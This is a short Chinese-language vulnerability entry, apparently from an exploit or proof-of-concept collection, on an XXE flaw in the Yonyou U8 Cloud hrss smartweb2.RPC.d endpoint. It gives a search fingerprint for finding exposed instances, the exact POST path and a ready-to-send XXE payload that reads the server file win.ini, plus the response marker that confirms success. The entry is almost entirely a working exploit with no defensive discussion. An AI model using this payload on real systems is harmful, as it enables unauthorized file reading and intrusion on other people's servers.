# 用友U8Cloudsmartweb2.RPC.d存在XXE漏洞

用友 ｜ XXE ｜ —
- **指纹**：`app="用友-U8-Cloud"`
- **请求**：`POST /hrss/dorado/smartweb2.RPC.d?__rpc=true HTTP/1.1`

**Payload**
```
__viewInstanceId=nc.bs.hrss.rm.ResetPassword~nc.bs.hrss.rm.ResetPasswordViewModel&__xml=<!DOCTYPE z [<!ENTITY Password SYSTEM "file:///C://windows//win.ini" >]><rpc transaction="10" method="resetPwd"><vps><p name="__profileKeys">%26Password;</p ></vps></rpc>
```
- **响应特征**：200 support